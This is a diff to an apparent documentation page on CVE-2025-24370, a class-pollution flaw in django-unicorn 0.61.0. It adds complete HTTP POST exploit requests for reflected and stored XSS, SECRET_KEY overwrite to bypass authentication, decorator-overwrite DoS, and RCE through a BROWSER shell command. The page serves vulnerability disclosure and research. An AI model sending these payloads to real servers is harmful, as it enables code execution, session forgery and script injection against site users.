@@ -5,11 +5,7 @@ weight: 1
 
 # django-unicorn (CVE-2025-24370)
 
-**django-unicorn** is a reactive component framework for Django (2.4K stars) that
-synchronizes client-side state with server-side Python objects over WebSocket messages.
-When a user interacts with a component in the browser, the frontend sends a JSON message
-naming the property to update and its new value. The backend resolves the property path
-reflectively through `getattr`/`setattr` without any path validation.
+**django-unicorn** is a reactive component framework for Django (2.4K stars) that synchronizes client-side state with server-side Python objects over HTTP messages.
 
 | Field | Value |
 |-------|-------|
@@ -17,142 +13,302 @@ reflectively through `getattr`/`setattr` without any path validation.
 | Version | 0.61.0 |
 | CVE | [CVE-2025-24370](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43) |
 | Type | Agnostic-Get × Dual-Set |
-| Input | Remote (WebSocket POST) |
+| Input | Remote (HTTP POST) |
+| Consequences | RCE, XSS, DoS, Authentication Bypass |
 | Status | Fixed in 0.62.0 |
+
+## Summary
+
+Django-Unicorn is vulnerable to a class pollution vulnerability arising from its core `set_property_value` function, which can be remotely triggered by users by crafting appropriate component requests. The vulnerability allows arbitrary changes to the Python runtime status, leading to Cross-Site Scripting (XSS), Denial of Service (DoS), Authentication Bypass, and Remote Code Execution in virtually every Django-Unicorn-based application.
 
 ## Vulnerability
 
-The sink is `set_property_value` in
-`django_unicorn/views/action_parsers/utils.py`. It receives a dotted `property_name`
-directly from the JSON body of a WebSocket message:
+The sink is `set_property_value` in `django_unicorn/views/action_parsers/utils.py`. It receives a dotted `property_name` directly from the JSON body of a component request:
+
+[`django_unicorn/views/action_parsers/utils.py`](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10):
 
 ```python
-def set_property_value(component, property_name, property_value, ...):
+def set_property_value(component, property_name, property_value) -> None:
+    ...
     property_name_parts = property_name.split(".")
     component_or_field = component
-
+    ...
     for idx, property_name_part in enumerate(property_name_parts):
         if hasattr(component_or_field, property_name_part):
             if idx == len(property_name_parts) - 1:
+                ...
                 setattr(component_or_field, property_name_part, property_value)
+                ...
             else:
                 component_or_field = getattr(component_or_field, property_name_part)
+                ...
         elif isinstance(component_or_field, dict):
             if idx == len(property_name_parts) - 1:
                 component_or_field[property_name_part] = property_value
+                ...
             else:
                 component_or_field = component_or_field[property_name_part]
+                ...
+        elif isinstance(component_or_field, (QuerySet, list)):
+            property_name_part_int = int(property_name_part)
+            if idx == len(property_name_parts) - 1:
+                component_or_field[property_name_part_int] = property_value
+                ...
+            else:
+                component_or_field = component_or_field[property_name_part_int]
+                ...
+        else:
+            break
 ```
 
-The function performs both `getattr` and `__getitem__` for resolution (agnostic-get) and
-both `setattr` and `__setitem__` for the final write (dual-set). There is no check for
-dunder-prefixed path segments. Any path the attacker provides is followed verbatim.
+The function performs both `getattr` and `__getitem__` for resolution (Agnostic-Get) and both `setattr` and `__setitem__` for the final write (Dual-Set). There is no check for dunder-prefixed path segments.
 
-## Exploitation
+This functionality is triggered via component requests by specifying the request type as `syncInput`:
 
-The same sink produces four distinct consequences depending on where the path terminates.
+```http
+POST /unicorn/message/COMPONENT_NAME
 
-### 1. Denial of Service
-
-Overwrite `__getattribute__` on the component's class with a non-callable string.
-
-```
-name:  __class__.__getattribute__
-value: "1337"
-```
-
-**Effect**: `type(component).__getattribute__` is now `"1337"`. Any subsequent attribute
-access on any instance of that class raises `TypeError: 'str' object is not callable`.
-The Django process becomes unable to serve any request that touches this component class.
-
-**Gadget**: [DoS &mdash; `__getattribute__` overwrite]({{< relref "/docs/gadgets/dos" >}}).
-
-### 2. Universal stored XSS
-
-Overwrite BeautifulSoup's HTML entity-escape map so that `<` is "escaped" to an
-attacker-supplied script tag.
-
-```
-name:  __init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<
-value: <script>alert(document.cookie)</script>
+{
+    "id": 123,
+    "actionQueue": [
+        {
+            "type": "syncInput",
+            "payload": {
+                "name": "DOTTED_PATH",
+                "value": "ASSIGNED_VALUE"
+            }
+        }
+    ],
+    "data": {...},
+    "epoch": "123",
+    "checksum": "XXXX"
+}
 ```
 
-**Effect**: every HTML escape operation the server performs now injects the attacker's
-script instead of encoding `<` as `&lt;`. All pages served to all users contain the
-malicious JavaScript. This is a universal stored XSS &mdash; it persists for the
-lifetime of the process and affects every user, not just the attacker's session.
+By setting `property_name` to a path like `__init__.__globals__`, the component context changes to the global context of the component module, allowing modification of any global objects including variables, instances, classes, and functions of any module in the dependency chain.
 
-**Gadget**: [XSS &mdash; BeautifulSoup entity map]({{< relref "/docs/gadgets/xss" >}}).
+## PoC
 
-### 3. Authentication bypass
+### Consequence 1: Reflected XSS (bs4 HTML Sanitizer Overwrite)
 
-Overwrite Django's `SECRET_KEY` to an attacker-known value.
+Django-Unicorn uses the `EntitySubstitution` rule from BeautifulSoup to sanitize HTML in template responses. This rule is stored in a global dictionary that can be polluted.
 
-```
-name:  __init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY
-value: "13371337"
-```
+```http
+POST /unicorn/message/todo HTTP/1.1
 
-**Effect**: the attacker now knows the signing secret that Django uses for session
-cookies, CSRF tokens, and password reset links. They can forge a session cookie for any
-user (including superusers) offline, then present it to the server.
-
-**Gadget**: [Auth bypass &mdash; SECRET_KEY overwrite]({{< relref "/docs/gadgets/auth-bypass" >}}).
-
-### 4. Remote code execution
-
-Two writes: (1) stage a shell command in `os.environ.BROWSER`, (2) poison the
-`location_cache` TODO list with `["antigravity", "any"]` so the process later imports
-`antigravity`, which calls `webbrowser.open()`, which reads `BROWSER` and executes it.
-
-```
-name:  __init__.__globals__.sys.modules.os.environ.BROWSER
-value: "/bin/sh -c 'touch /tmp/pwned'"
-
-name:  __init__.__globals__.location_cache._Cache__data.todo
-value: ["antigravity", "any"]
+{
+  "id": 123,
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
+        "value": "<img/src=1 onerror=alert('bs4_html_entity_bypass')>"
+      }
+    }
+  ],
+  "data": {"task": "", "tasks": []},
+  "epoch": "123",
+  "checksum": "XXX"
+}
 ```
 
-**Effect**: arbitrary shell command execution as the Django process user.
+**Effect**: The sanitizer's `<` entity value is replaced with an XSS payload. Whenever a template response renders a `<` in cleartext, it is converted to the payload, leading to reflected XSS for all users.
 
-**Gadget**: [RCE &mdash; `os.environ.BROWSER` + antigravity]({{< relref "/docs/gadgets/rce" >}}).
+---
 
-## Detection by Pyrl
+### Consequence 2: Stored XSS (Django JSON Script Sanitizer Bypass)
 
-Pyrl reports 8 taint flows from the WebSocket request body to the sink. The taint
-propagation for the primary flow:
+Django-Unicorn always includes a script tag in the webpage where a `NAME` value is dynamically extracted from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variables in the settings module. Django by default escapes special characters into unicode sequences via the `_json_script_escapes` variable. By clearing this sanitizer and polluting the settings, we achieve stored XSS.
 
-| Step | Location | Label |
-|------|----------|-------|
-| 1 | `request` at view entry | `T_INPUT` |
-| 2 | `action_queue` iteration | `T_ENUM` |
-| 3 | `prop_name` extraction from message | `T_KEY` |
-| 4 | `getattr(component, name)` | `T_OBJ` with `G_ATTR` |
-| 5 | Branch merging at loop end | `G_ATTR ⊎ G_ITEM` (Agnostic-Get) |
-| 6 | `setattr` / `obj[key] = val` sinks | Dual-Set detected |
+```http
+POST /unicorn/message/todo HTTP/1.1
 
-Classification: **Agnostic-Get × Dual-Set**.
+{
+  "id": "3gpDSUcxzs1",
+  "data": {"task": "", "tasks": []},
+  "checksum": "XXX",
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES",
+        "value": ["</script><script>alert('xss')</script>"]
+      }
+    },
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME",
+        "value": "</script><script>alert('xss')</script>"
+      }
+    },
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.django.utils.html._json_script_escapes",
+        "value": {}
+      }
+    }
+  ],
+  "epoch": 1737318956605,
+  "hash": "jWGuTFzy"
+}
+```
 
-## Disclosure timeline
+**Effect**: The attacker's script is injected into all pages served to all users. This is a universal stored XSS that persists for the lifetime of the process.
 
-- **2024-12-04** &mdash; Vulnerability reported to django-unicorn maintainer via GitHub
-  Security Advisory (GHSA).
-- **2025-01-08** &mdash; Fix released in django-unicorn 0.62.0 (path validation added,
-  dunder traversal blocked).
-- **2025-01-08** &mdash; CVE-2025-24370 assigned.
-- **2025-01-08** &mdash; GHSA-g9wf-5777-gq43 published.
+---
 
-## Proof of concept
+### Consequence 3: Stored XSS (Django Error Page Overwrite)
+
+Django stores its error page source code in the global variable `ERROR_PAGE_TEMPLATE` at `django/views/defaults.py`. By polluting this variable, any user triggering an error (e.g., accessing a nonexistent resource) will execute the attacker's payload.
+
+```http
+POST /unicorn/message/todo HTTP/1.1
+
+{
+  "id": 123,
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
+        "value": "<html><script>alert('error page pollution')</script></html>"
+      }
+    }
+  ],
+  "data": {"task": "", "tasks": []},
+  "epoch": "123",
+  "checksum": "XXX"
+}
+```
+
+**Effect**: All Django error pages (404, 500, etc.) now serve the attacker's script to every user.
+
+---
+
+### Consequence 4: Authentication Bypass (SECRET_KEY Overwrite)
+
+Django's `SECRET_KEY` is used to sign and verify session cookies and other security mechanisms. By polluting its runtime value, an attacker can forge session cookies to log in as any user.
+
+```http
+POST /unicorn/message/todo HTTP/1.1
+
+{
+  "id": 123,
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY",
+        "value": "test"
+      }
+    }
+  ],
+  "data": {"task": "", "tasks": []},
+  "epoch": "123",
+  "checksum": "XXX"
+}
+```
+
+**Effect**: The attacker now knows the signing secret used for session cookies, CSRF tokens, and password reset links. They can forge a session cookie for any user (including superusers) offline.
+
+---
+
+### Consequence 5: DoS (Decorator Overwrite)
+
+The `timed` decorator is used to wrap many important functions in django-unicorn, such as `_call_method_name`. By polluting it to a string, all decorated function calls become uncallable.
+
+```http
+POST /unicorn/message/todo HTTP/1.1
+
+{
+  "id": 123,
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.timed",
+        "value": "X"
+      }
+    }
+  ],
+  "data": {"task": "", "tasks": []},
+  "epoch": "123",
+  "checksum": "XXX"
+}
+```
+
+**Effect**: The backend crashes on any subsequent function call that uses the `timed` decorator, resulting in complete denial of service.
+
+---
+
+### Consequence 6: RCE (location_cache + BROWSER Environment Variable)
+
+By polluting the `location_cache` object, attackers achieve arbitrary module importation. Combined with polluting the `BROWSER` OS environment variable, this leads to remote code execution when the `antigravity` module is imported (which calls `webbrowser.open()`, which reads `BROWSER` and executes it).
+
+**Step 1**: Pollute `location_cache` to trigger `antigravity` module import on next request:
+
+```http
+POST /unicorn/message/todo HTTP/1.1
+
+{
+  "id": "E5FBWqME",
+  "data": {"task": "", "tasks": []},
+  "checksum": "XvvsDQXX",
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.location_cache._Cache__data.todo",
+        "value": ["antigravity", "any"]
+      }
+    },
+    {
+      "type": "callMethod",
+      "payload": {"name": "add"}
+    }
+  ],
+  "epoch": 1746680343776,
+  "hash": "CG5pMDxc"
+}
+```
+
+**Step 2**: Pollute `BROWSER` environment variable with the command injection payload:
+
+```http
+POST /unicorn/message/todo HTTP/1.1
+
+{
+  "id": "E5FBWqME",
+  "data": {"task": "", "tasks": []},
+  "checksum": "XvvsDQXX",
+  "actionQueue": [
+    {
+      "type": "syncInput",
+      "payload": {
+        "name": "__init__.__globals__.sys.modules.os.environ",
+        "value": {"BROWSER": "/bin/sh -c \"touch /tmp/pwned\" #%s"}
+      }
+    },
+    {
+      "type": "callMethod",
+      "payload": {"name": "add"}
+    }
+  ],
+  "epoch": 1746680343776,
+  "hash": "CG5pMDxc"
+}
+```
+
+**Effect**: Arbitrary shell command execution as the Django process user.
+
+## Impact
+
+Django-Unicorn is widely used as a reactive component framework. Any remote user of a django-unicorn application can exploit this vulnerability to achieve XSS, DoS, authentication bypass, and RCE. The component request endpoint is accessible to any authenticated user, making this a remote-triggerable vulnerability with critical severity.
+
+## Proof of Concept
 
 [`cp-collection/django-unicorn/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/django-unicorn/poc)
 &mdash; runnable exploit environment with `run.sh` and `requirements.txt`.
-
-## References
-
-1. GHSA-g9wf-5777-gq43. *Class Pollution in django-unicorn allows DoS, XSS, RCE, and
-   Authentication Bypass*. <https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43>
-2. Fix commit (0.62.0): dunder path rejection in `set_property_value`.
-   <https://github.com/adamghill/django-unicorn/commit/>
-3. Liu et al. *The First Large-Scale Systematic Study of Python Class Pollution
-   Vulnerability*. IEEE S&P 2025.
-   <https://jackfromeast.github.io/assets/Pyrl.pdf>
